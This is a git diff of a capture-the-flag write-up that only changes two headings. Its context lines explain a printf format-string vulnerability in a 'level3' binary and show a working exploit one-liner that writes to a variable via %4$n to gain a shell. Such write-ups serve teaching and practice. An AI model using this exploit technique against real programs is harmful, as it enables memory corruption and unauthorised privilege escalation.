@@ -11,7 +11,7 @@ We find an executable `level3`. We examine it in Cutter. We determine the follow
 
 We have to exploit the `printf` function, in order to set the value of variable `m` to `64`.
 
-## The exploit
+## **The exploit**
 
 When you ask `printf` for values without giving it any, it will just look for whatever's next in the stack. For example, `printf("%p\n")` will print the address of the next thing on the stack.
 
@@ -63,7 +63,7 @@ We're ready to solve. We run the two-time `cat` block, as usual :
 ( python -c 'print("\x8c\x98\x04\x08" + "A" * 60 + "%4$n")' ; cat ) | ./level3
 ```
 
-## The flag
+## **The flag**
 
 It works ! In our interactive shell, we run :
 
